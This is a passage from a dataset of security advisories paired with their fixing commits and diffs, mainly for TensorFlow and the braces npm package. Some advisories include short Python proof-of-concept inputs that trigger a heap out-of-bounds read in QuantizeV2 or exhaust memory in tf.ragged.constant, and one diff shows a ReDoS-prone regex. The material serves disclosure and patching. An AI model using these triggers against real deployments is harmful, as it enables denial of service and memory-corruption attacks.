'')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/git.js'])","num_files":1.0},{"index":1610,"vuln_id":"GHSA-cvgx-3v3q-m36c","cwe_id":"{'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a0d64445116c43cf46a5666bd4eee28e7a82f244'}","dataset":"osv","summary":"Heap OOB in shape inference for `QuantizeV2` ### Impact\nThe [shape inference code for `QuantizeV2`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/framework\/common_shape_fns.cc#L2509-L2530) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  data=tf.raw_ops.QuantizeV2(\n    input=[1.0,1.0],\n    min_range=[1.0,10.0],\n    max_range=[1.0,10.0],\n    T=tf.qint32,\n    mode='MIN_COMBINED',\n    round_mode='HALF_TO_EVEN',\n    narrow_range=False,\n    axis=-100,\n    ensure_minimum_range=10)\n  return data\n\ntest()\n```\n\nThis occurs whenever `axis` is a negative value less than `-1`. In this case, we are accessing data before the start of a heap buffer:\n    \n```cc\nint axis = -1;\nStatus s = c->GetAttr(\"axis\", &axis);\nif (!s.ok() && s.code() != error::NOT_FOUND) {\n  return s;\n}   \n... \nif (axis != -1) {\n  ...\n  TF_RETURN_IF_ERROR(\n      c->Merge(c->Dim(minmax, 0), c->Dim(input, axis), &depth));\n}\n```\n\nThe code allows `axis` to be an optional argument (`s` would contain an `error::NOT_FOUND` error code). Otherwise, it assumes that `axis` is a valid index into the dimensions of the `input` tensor. If `axis` is less than `-1` then this results in a heap OOB read.\n    \n### Patches\nWe have patched the issue in GitHub commit [a0d64445116c43cf46a5666bd4eee28e7a82f244](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a0d64445116c43cf46a5666bd4eee28e7a82f244).\n    \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, as this version is the only one that is also affected.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a0d64445116c43cf46a5666bd4eee28e7a82f244","commit_sha":"a0d64445116c43cf46a5666bd4eee28e7a82f244","patch":"SINGLE","chain_ord":"['a0d64445116c43cf46a5666bd4eee28e7a82f244']","before_first_fix_commit":"{'4a7c71d60c94ae3bc8149429988eeeb1d5466f00'}","last_fix_commit":"a0d64445116c43cf46a5666bd4eee28e7a82f244","chain_ord_pos":1.0,"commit_datetime":"10\/01\/2021, 22:52:56","message":"Prevent OOB access in QuantizeV2 shape inference\n\nPiperOrigin-RevId: 400309614\nChange-Id: I31412c71b05b4f21b677f7fa715a61499cbee39d","author":"Yu-Cheng Ling","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/framework\/common_shape_fns.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a0d64445116c43cf46a5666bd4eee28e7a82f244\/tensorflow%2Fcore%2Fframework%2Fcommon_shape_fns.cc', 'patch': '@@ -2559,6 +2559,9 @@ Status QuantizeV2Shape(InferenceContext* c) {\\n   if (!s.ok() && s.code() != error::NOT_FOUND) {\\n     return s;\\n   }\\n+  if (axis < -1) {\\n+    return errors::InvalidArgument(\"axis should be at least -1, got \", axis);\\n+  }\\n   const int minmax_rank = (axis == -1) ? 0 : 1;\\n   TF_RETURN_IF_ERROR(shape_inference::UnchangedShape(c));\\n   ShapeHandle minmax;'}}","message_norm":"prevent oob access in quantizev2 shape inference\n\npiperorigin-revid: 400309614\nchange-id: i31412c71b05b4f21b677f7fa715a61499cbee39d","language":"en","entities":"[('prevent', 'ACTION', ''), ('oob', 'SECWORD', ''), ('400309614', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/common_shape_fns.cc'])","num_files":1.0},{"index":1613,"vuln_id":"GHSA-cvpc-8phh-8f45","cwe_id":"{'CWE-787', 'CWE-125'}","score":4.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/00302787b788c5ff04cb6f62aed5a74d936e86c0', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e11f55585f614645b360563072ffeb5c3eeff162', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/46d5b0852528ddfd614ded79bccc75589f801bd9', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1970c2158b1ffa416d159d03c3370b9a462aee35', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fff2c8326280c07733828f990548979bdc893859'}","dataset":"osv","summary":"Out of bounds access in tensorflow-lite ### Impact\nIn TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input\/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor:https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/kernels\/kernel_util.cc#L36\n\nHowever, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/c\/common.h#L82\n\nThis results in special casing during validation at model loading time: https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/core\/subgraph.cc#L566-L580\n\nUnfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don't expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.\n\nThis results in both read and write gadgets, albeit very limited in scope.\n\n### Patches\nWe have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-09-25","chain_len":6,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/00302787b788c5ff04cb6f62aed5a74d936e86c0","commit_sha":"00302787b788c5ff04cb6f62aed5a74d936e86c0","patch":"MULTI","chain_ord":"['46d5b0852528ddfd614ded79bccc75589f801bd9', '00302787b788c5ff04cb6f62aed5a74d936e86c0', 'e11f55585f614645b360563072ffeb5c3eeff162', 'cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f', 'fff2c8326280c07733828f990548979bdc893859', '1970c2158b1ffa416d159d03c3370b9a462aee35']","before_first_fix_commit":"{'fff2c8326280c07733828f990548979bdc893859'}","last_fix_commit":"1970c2158b1ffa416d159d03c3370b9a462aee35","chain_ord_pos":2.0,"commit_datetime":"09\/18\/2020, 20:16:53","message":"[tflite] Make `GetOptionalInputTensor` the same as `GetInput`.\n\nWith the previous change, there is no more need for two separate APIs. We would deprecate `GetOptionalInputTensor` in the future.\n\nPiperOrigin-RevId: 332513386\nChange-Id: Id7110271c25ebd6126ad8c82a493e37e0e0756b3","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 6, 'total': 7}","files":"{'tensorflow\/lite\/kernels\/kernel_util.cc': {'additions': 1, 'deletions': 6, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/00302787b788c5ff04cb6f62aed5a74d936e86c0\/tensorflow%2Flite%2Fkernels%2Fkernel_util.cc', 'patch': '@@ -75,12 +75,7 @@ TfLiteTensor* GetOutput(TfLiteContext* context, const TfLiteNode* node,\\n \\n const TfLiteTensor* GetOptionalInputTensor(const TfLiteContext* context,\\n                                            const TfLiteNode* node, int index) {\\n-  const bool use_tensor = index < node->inputs->size &&\\n-                          node->inputs->data[index] != kTfLiteOptionalTensor;\\n-  if (use_tensor) {\\n-    return GetMutableInput(context, node, index);\\n-  }\\n-  return nullptr;\\n+  return GetInput(context, node, index);\\n }\\n \\n \/\/ Per-axis'}}","message_norm":"[tflite] make `getoptionalinputtensor` the same as `getinput`.\n\nwith the previous change, there is no more need for two separate apis. we would deprecate `getoptionalinputtensor` in the future.\n\npiperorigin-revid: 332513386\nchange-id: id7110271c25ebd6126ad8c82a493e37e0e0756b3","language":"en","entities":"[('332513386', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/kernel_util.cc'])","num_files":1.0},{"index":1616,"vuln_id":"GHSA-cvpc-8phh-8f45","cwe_id":"{'CWE-787', 'CWE-125'}","score":4.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/00302787b788c5ff04cb6f62aed5a74d936e86c0', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e11f55585f614645b360563072ffeb5c3eeff162', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/46d5b0852528ddfd614ded79bccc75589f801bd9', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1970c2158b1ffa416d159d03c3370b9a462aee35', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fff2c8326280c07733828f990548979bdc893859'}","dataset":"osv","summary":"Out of bounds access in tensorflow-lite ### Impact\nIn TensorFlow Lite, saved models in the flatbuffer format use a double indexing scheme: a model has a set of subgraphs, each subgraph has a set of operators and each operator has a set of input\/output tensors. The flatbuffer format uses indices for the tensors, indexing into an array of tensors that is owned by the subgraph. This results in a pattern of double array indexing when trying to get the data of each tensor:https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/kernels\/kernel_util.cc#L36\n\nHowever, some operators can have some tensors be optional. To handle this scenario, the flatbuffer model uses a negative `-1` value as index for these tensors:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/c\/common.h#L82\n\nThis results in special casing during validation at model loading time: https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/core\/subgraph.cc#L566-L580\n\nUnfortunately, this means that the `-1` index is a valid tensor index for any operator, including those that don't expect optional inputs and including for output tensors. Thus, this allows writing and reading from outside the bounds of heap allocated arrays, although only at a specific offset from the start of these arrays.\n\nThis results in both read and write gadgets, albeit very limited in scope.\n\n### Patches\nWe have patched the issue in several commits (46d5b0852, 00302787b7, e11f5558, cd31fd0ce, 1970c21, and fff2c83). We will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that only operators which accept optional inputs use the `-1` special value and only for the tensors that they expect to be optional. Since this allow-list type approach is erro-prone, we advise upgrading to the patched code.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-09-25","chain_len":6,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f","commit_sha":"cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f","patch":"MULTI","chain_ord":"['46d5b0852528ddfd614ded79bccc75589f801bd9', '00302787b788c5ff04cb6f62aed5a74d936e86c0', 'e11f55585f614645b360563072ffeb5c3eeff162', 'cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f', 'fff2c8326280c07733828f990548979bdc893859', '1970c2158b1ffa416d159d03c3370b9a462aee35']","before_first_fix_commit":"{'fff2c8326280c07733828f990548979bdc893859'}","last_fix_commit":"1970c2158b1ffa416d159d03c3370b9a462aee35","chain_ord_pos":4.0,"commit_datetime":"09\/18\/2020, 20:44:32","message":"[tflite]: Insert `nullptr` checks when obtaining tensors.\n\nAs part of ongoing refactoring, `tflite::GetInput`, `tflite::GetOutput`, `tflite::GetTemporary` and `tflite::GetIntermediates` will return `nullptr` in some cases. Hence, we insert the `nullptr` checks on all usages.\n\nWe also insert `nullptr` checks on usages of `tflite::GetVariableInput` and `tflite::GetOptionalInputTensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).\n\nPiperOrigin-RevId: 332518902\nChange-Id: I92eb164a6101ac3cca66090061a9b56a97288236","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 16, 'deletions': 7, 'total': 23}","files":"{'tensorflow\/lite\/micro\/test_helpers.cc': {'additions': 16, 'deletions': 7, 'changes': 23, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/cd31fd0ce0449a9e0f83dcad08d6ed7f1d6bef3f\/tensorflow%2Flite%2Fmicro%2Ftest_helpers.cc', 'patch': '@@ -601,7 +601,8 @@ TfLiteStatus SimpleStatefulOp::Prepare(TfLiteContext* context,\\n   OpData* data = reinterpret_cast<OpData*>(node->user_data);\\n \\n   \/\/ Make sure that the input is in uint8_t with at least 1 data entry.\\n-  const TfLiteTensor* input = tflite::GetInput(context, node, kInputTensor);\\n+  const TfLiteTensor* input;\\n+  TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, kInputTensor, &input));\\n   if (input->type != kTfLiteUInt8) return kTfLiteError;\\n   if (NumElements(input->dims) == 0) return kTfLiteError;\\n \\n@@ -622,7 +623,8 @@ TfLiteStatus SimpleStatefulOp::Invoke(TfLiteContext* context,\\n   OpData* data = reinterpret_cast<OpData*>(node->user_data);\\n   *data->invoke_count += 1;\\n \\n-  const TfLiteTensor* input = GetInput(context, node, kInputTensor);\\n+  const TfLiteTensor* input;\\n+  TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, kInputTensor, &input));\\n   const uint8_t* input_data = GetTensorData<uint8_t>(input);\\n   int size = NumElements(input->dims);\\n \\n@@ -641,9 +643,13 @@ TfLiteStatus SimpleStatefulOp::Invoke(TfLiteContext* context,\\n     }\\n   }\\n \\n-  TfLiteTensor* median = GetOutput(context, node, kMedianTensor);\\n+  TfLiteTensor* median;\\n+  TF_LITE_ENSURE_OK(context,\\n+                    GetOutputSafe(context, node, kMedianTensor, &median));\\n   uint8_t* median_data = GetTensorData<uint8_t>(median);\\n-  TfLiteTensor* invoke_count = GetOutput(context, node, kInvokeCount);\\n+  TfLiteTensor* invoke_count;\\n+  TF_LITE_ENSURE_OK(context,\\n+                    GetOutputSafe(context, node, kInvokeCount, &invoke_count));\\n   int32_t* invoke_count_data = GetTensorData<int32_t>(invoke_count);\\n \\n   median_data[0] = sorting_buffer[size \/ 2];\\n@@ -681,11 +687,14 @@ TfLiteStatus MockCustom::Prepare(TfLiteContext* context, TfLiteNode* node) {\\n }\\n \\n TfLiteStatus MockCustom::Invoke(TfLiteContext* context, TfLiteNode* node) {\\n-  const TfLiteTensor* input = tflite::GetInput(context, node, 0);\\n+  const TfLiteTensor* input;\\n+  TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 0, &input));\\n   const int32_t* input_data = input->data.i32;\\n-  const TfLiteTensor* weight = tflite::GetInput(context, node, 1);\\n+  const TfLiteTensor* weight;\\n+  TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 1, &weight));\\n   const uint8_t* weight_data = weight->data.uint8;\\n-  TfLiteTensor* output = GetOutput(context, node, 0);\\n+  TfLiteTensor* output;\\n+  TF_LITE_ENSURE_OK(context, GetOutputSafe(context, node, 0, &output));\\n   int32_t* output_data = output->data.i32;\\n   output_data[0] =\\n       0;  \/\/ Catch output tensor sharing memory with an input tensor'}}","message_norm":"[tflite]: insert `nullptr` checks when obtaining tensors.\n\nas part of ongoing refactoring, `tflite::getinput`, `tflite::getoutput`, `tflite::gettemporary` and `tflite::getintermediates` will return `nullptr` in some cases. hence, we insert the `nullptr` checks on all usages.\n\nwe also insert `nullptr` checks on usages of `tflite::getvariableinput` and `tflite::getoptionalinputtensor` but only in the cases where there is no obvious check that `nullptr` is acceptable (that is, we only insert the check for the output of these two functions if the tensor is accessed as if it is always not `nullptr`).\n\npiperorigin-revid: 332518902\nchange-id: i92eb164a6101ac3cca66090061a9b56a97288236","language":"en","entities":"[('nullptr', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('nullptr', 'SECWORD', ''), ('332518902', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/micro\/test_helpers.cc'])","num_files":1.0},{"index":1624,"vuln_id":"GHSA-cwfw-4gq5-mrqx","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/micromatch\/braces\/commit\/abdafb0cae1e0c00f184abbadc692f4eaa98f451'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) in braces A vulnerability was found in Braces versions prior to 2.3.1. Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/micromatch\/braces","commit_href":"https:\/\/github.com\/micromatch\/braces\/commit\/abdafb0cae1e0c00f184abbadc692f4eaa98f451","commit_sha":"abdafb0cae1e0c00f184abbadc692f4eaa98f451","patch":"SINGLE","chain_ord":"['abdafb0cae1e0c00f184abbadc692f4eaa98f451']","before_first_fix_commit":"{'37934142c1aeea48b6fb03edbdcf90e45b5cb4a1'}","last_fix_commit":"abdafb0cae1e0c00f184abbadc692f4eaa98f451","chain_ord_pos":1.0,"commit_datetime":"02\/16\/2018, 21:09:36","message":"optimize regex","author":"jonschlinkert","comments":"{'com_1': {'author': 'sathish-spidie', 'datetime': '04\/18\/2019, 03:42:11', 'body': \"can you explain, how to achieve this? I'm a low-level developer and didn't understand why this code stands for and what to do with it! sorry if I waste your time by making you read this comment, in case you find this comment useless.\\r\\n\\r\\nmy error is\\r\\n\\r\\n` Low             Regular Expression Denial of Service                          \\r\\n                                                                                \\r\\n  Package         braces                                                        \\r\\n                                                                                \\r\\n  Patched in      >=2.3.1                                                       \\r\\n                                                                                \\r\\n  Dependency of   browser-sync [dev]                                            \\r\\n                                                                                \\r\\n  Path            browser-sync > micromatch > braces                            \\r\\n                                                                                \\r\\n  More info       https:\/\/npmjs.com\/advisories\/786         `\"}, 'com_2': {'author': 'kousu', 'datetime': '04\/18\/2019, 18:24:04', 'body': '@sathish-spidie , you can find out the solution on the link there: https:\/\/npmjs.com\/advisories\/786:\\r\\n\\r\\n> Remediation\\r\\n> \\r\\n> Upgrade to version 2.3.1 or higher.\\r\\n\\r\\nWhat this means is that in your package.json you should make sure the line for \"braces\" under \"dependencies\"  says\\r\\n\\r\\n```\\r\\n\"braces\": \"^2.3.1\",\\r\\n```\\r\\n\\r\\nand then delete your cached npm packages by \\r\\n\\r\\n```\\r\\nrm -r node_modules\/ package-lock.json\\r\\n```\\r\\n\\r\\nand then\\r\\n\\r\\n```\\r\\nnpm install\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\nIf you don\\'t directly depend on \"braces\", which is the situation I am in, you can use\\r\\n\\r\\n```\\r\\nnpm list\\r\\n```\\r\\n\\r\\nto figure out which of your packages is depending on \"braces\", and then go make sure to update each of those packages in the same way: version bump them, make sure to prefix the versions of everything with \"^\", and then delete your packages and regenerate package-lock.json by redoing `npm install`; that will get the latest, hopefully bugfixed, versions of all your packages; but if any of your packages have not yet updated to use `\"braces\": \"^2.3.1\"` then you will have to go to their github projects and file an issue. \\r\\n\\r\\n---\\r\\n\\r\\nA comment on a commit inside the braces project isn\\'t really a proper general support forum for npm. For that, and for future questions, you will probably have good luck asking at https:\/\/npm.community\/c\/support.  I hope the above helps and lets you extend your developer skills.'}, 'com_3': {'author': 'jonschlinkert', 'datetime': '04\/18\/2019, 20:01:13', 'body': \"@kousu that was a fantastic description, and a really good summary of the steps that need to be taken. Thank you!\\r\\n\\r\\n> you will probably have good luck asking at https:\/\/npm.community\/c\/support. I hope the above helps and lets you extend your developer skills.\\r\\n\\r\\nOnly one thing I'd like to point out. Generally, https:\/\/npm.community\/c\/support is for **NPM** support, not for packages like this one. Meaning, if you need something directly related to the package manager itself, that's the place to go. But ideally, when a user has an issue or support question like this, the best place to get answers is to:\\r\\n\\r\\n1. read through previous issues first - @sathish-spidie would have seen that this question has been answered a couple of dozen times already on this project and other projects that depend on this one\\r\\n1. StackOverflow - people get reputation points for helping others\\r\\n1. if it seems like no one has addressed the issue already, and you have genuinely stumbled across a previously undiscovered bug, then create a new issue on the GitHub repository of the code project.\"}, 'com_4': {'author': 'KevinGrant12', 'datetime': '05\/08\/2019, 23:49:41', 'body': \"Hello, I have the same exact issue that stems from babel.\\r\\nI was unable to run this line rm -r node_modules\/ package-lock.json and it makes sense because the packag-lock is not inside the node_modules directory.\\r\\nWhen I run npm list I can see that instances of 'braces' are at 2.3.2.\\r\\n\\r\\nAny thoughts on how to fix?\\r\\nThanks!\"}, 'com_5': {'author': 'biggianteye', 'datetime': '06\/07\/2019, 12:57:09', 'body': \"> I was unable to run this line rm -r node_modules\/ package-lock.json and it makes sense because the packag-lock is not inside the node_modules directory.\\r\\n\\r\\nThere is a space between `node_modules` and `package-lock.json`. The lock file is not inside the node_modules folder. It's at the same level.\"}, 'com_6': {'author': 'robpl1', 'datetime': '07\/14\/2019, 08:57:18', 'body': 'The problem I have here is that the braces package itself is showing \\r\\n{  \"_from\": \"braces@^1.8.2\",\\r\\n  \"_id\": \"braces@1.8.5\",\\r\\n\\r\\nSo how to update that would help.'}, 'com_7': {'author': 'martynawilkonska', 'datetime': '07\/16\/2019, 08:45:50', 'body': 'I have the same problem. I am unable to update braces, after reinstall they are still 1.8.5.'}, 'com_8': {'author': 'janzenz', 'datetime': '10\/08\/2019, 02:02:12', 'body': \"@martynawilkonska have you removed your `node_modules` cache and `package-lock.json` file? If not, try that and `npm install` again. If it still does that, my next hunch is that you're `braces` is a transitive dependency in your package. Try `npm ls braces` and see which package requires it and maybe you can try and upgrade that parent package which potentially will fix your problem.\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/parsers.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/micromatch\/braces\/raw\/abdafb0cae1e0c00f184abbadc692f4eaa98f451\/lib%2Fparsers.js', 'patch': \"@@ -127,7 +127,7 @@ module.exports = function(braces, options) {\\n     .set('multiplier', function() {\\n       var isInside = this.isInside('brace');\\n       var pos = this.position();\\n-      var m = this.match(\/^\\\\{(,+(?:(\\\\{,+\\\\})*),*|,*(?:(\\\\{,+\\\\})*),+)\\\\}\/);\\n+      var m = this.match(\/^\\\\{((?:,|\\\\{,+\\\\})+)\\\\}\/);\\n       if (!m) return;\\n \\n       this.multiplier = true;\"}}","message_norm":"optimize regex","language":"ro","entities":"[('optimize', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/parsers.js'])","num_files":1.0},{"index":1628,"vuln_id":"GHSA-cwpm-f78v-7m5c","cwe_id":"{'CWE-400', 'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bd4d5583ff9c8df26d47a23e508208844297310e'}","dataset":"osv","summary":"Denial of service in `tf.ragged.constant` due to lack of validation ### Impact\nThe implementation of [`tf.ragged.constant`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/python\/ops\/ragged\/ragged_factory_ops.py#L146-L239) does not fully validate the input arguments. This results in a denial of service by consuming all available memory:\n\n```python\nimport tensorflow as tf\ntf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [bd4d5583ff9c8df26d47a23e508208844297310e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bd4d5583ff9c8df26d47a23e508208844297310e).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/55199).","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bd4d5583ff9c8df26d47a23e508208844297310e","commit_sha":"bd4d5583ff9c8df26d47a23e508208844297310e","patch":"SINGLE","chain_ord":"['bd4d5583ff9c8df26d47a23e508208844297310e']","before_first_fix_commit":"{'e74ef072ecd54ca54f3940ce9b98af796ded2a1a'}","last_fix_commit":"bd4d5583ff9c8df26d47a23e508208844297310e","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2022, 16:11:43","message":"Prevent denial of service in `tf.ragged.constant`\n\nFixes #55199\n\nPiperOrigin-RevId: 442029525","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/python\/ops\/ragged\/ragged_factory_ops.py': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/bd4d5583ff9c8df26d47a23e508208844297310e\/tensorflow%2Fpython%2Fops%2Fragged%2Fragged_factory_ops.py', 'patch': '@@ -188,6 +188,9 @@ def _constant_value(ragged_factory, inner_factory, pylist, dtype, ragged_rank,\\n     if max_depth > scalar_depth:\\n       raise ValueError(\"Invalid pylist=%r: empty list nesting is greater \"\\n                        \"than scalar value nesting\" % pylist)\\n+    if ragged_rank is not None and max_depth < ragged_rank:\\n+      raise ValueError(f\"Invalid pylist={pylist}, max depth smaller than \"\\n+                       f\"ragged_rank={ragged_rank}\")\\n \\n   # If both inner_shape and ragged_rank were specified, then check that\\n   # they are compatible with pylist.'}}","message_norm":"prevent denial of service in `tf.ragged.constant`\n\nfixes #55199\n\npiperorigin-revid: 442029525","language":"en","entities":"[('prevent', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#55199', 'ISSUE', ''), ('442029525', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/python\/ops\/ragged\/ragged_factory_ops.py'])","num_files":1.0},{"index":1630,"vuln_id":"GHSA-cwv3-863g-39vx","cwe_id":"{'CWE-835', 'CWE-674'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c6173f5fe66cdbab74f4f869311fe6aae2ba35f4', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c1dc920d8ffb4893d6c9d27d1f039607b326743'}","dataset":"osv","summary":"Stack overflow due to looping TFLite subgraph ### Impact\nTFlite graphs must not have loops between nodes. However, this condition was not checked and an attacker could craft models that would result in infinite loop during evaluation. In certain cases, the infinite loop would be replaced by stack overflow due to too many recursive calls.\n\nFor example, the [`While` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/106d8f4fb89335a2c52d7c895b7a7485465ca8d9\/tensorflow\/lite\/kernels\/while.cc) could be tricked into a scneario where both the body and the loop subgraphs are the same. Evaluating one of the subgraphs means calling the `Eval` function for the other and this quickly exhaust all stack space.\n    \n### Patches \nWe have patched the issue in GitHub commit [9c1dc920d8ffb4893d6c9d27d1f039607b326743](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9c1dc920d8ffb4893d6c9d27d1f039607b326743) (for the `While` operator) and in GitHub commit [c6173f5fe66cdbab74f4f869311fe6aae2ba35f4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c6173f5fe66cdbab74f4f869311fe6aae2ba35f4) (in general).\n    \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For 